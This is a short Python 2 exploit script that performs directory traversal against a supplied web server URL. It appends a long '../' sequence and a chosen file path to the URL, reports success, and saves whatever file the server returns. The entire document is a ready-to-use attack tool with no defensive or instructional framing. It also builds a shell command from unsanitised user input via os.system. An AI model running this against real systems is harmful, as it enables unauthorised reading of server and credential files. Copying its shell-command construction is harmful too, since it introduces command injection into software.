#!/usr/bin/env python

import sys
import requests
import os
import time

if len(sys.argv) !=4:
	print "  "
	print "Usage : python exploit.py url filename outputname"
	print "Example : python exploit.py http://10.10.10.10/ windows/win.ini win.ini"	
	print "	"
else:


	traversal = "../../../../../../../../../../../../../"
	filename = sys.argv[2]
	url = sys.argv[1]+traversal+filename
	outputname = sys.argv[3]
	content = requests.get(url)

	if content.status_code == 200:
		
		print " "
		print "Directory Traversal Succeeded"
		time.sleep(3)
		print " "
		print "Saving Output"
		os.system("touch " + outputname)
		output_write = open(outputname,"r+")
		output_write.write(content.text)
		output_write.close()

	else:

		print "Host not vulnerable to Directory Traversal!"
